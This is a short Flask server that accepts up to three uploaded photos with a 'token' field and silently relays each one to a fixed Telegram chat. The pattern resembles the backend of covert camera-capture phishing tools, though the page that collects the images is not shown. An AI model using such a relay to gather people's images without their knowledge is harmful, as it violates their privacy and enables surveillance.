from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    print("❌ BOT_TOKEN یا CHAT_ID ست نشده")
    exit(1)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/upload", methods=["POST"])
def upload():
    token = request.form.get("token", "NO_TOKEN")

    for i in range(3):
        photo = request.files.get(f"photo{i}")
        if photo:
            send_to_telegram(photo, token, i)

    return "OK"

def send_to_telegram(photo, token, index):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {"photo": photo.stream}
    data = {
        "chat_id": CHAT_ID,
        "caption": f"📸 Photo {index+1}\nToken: {token}"
    }
    requests.post(url, files=files, data=data)
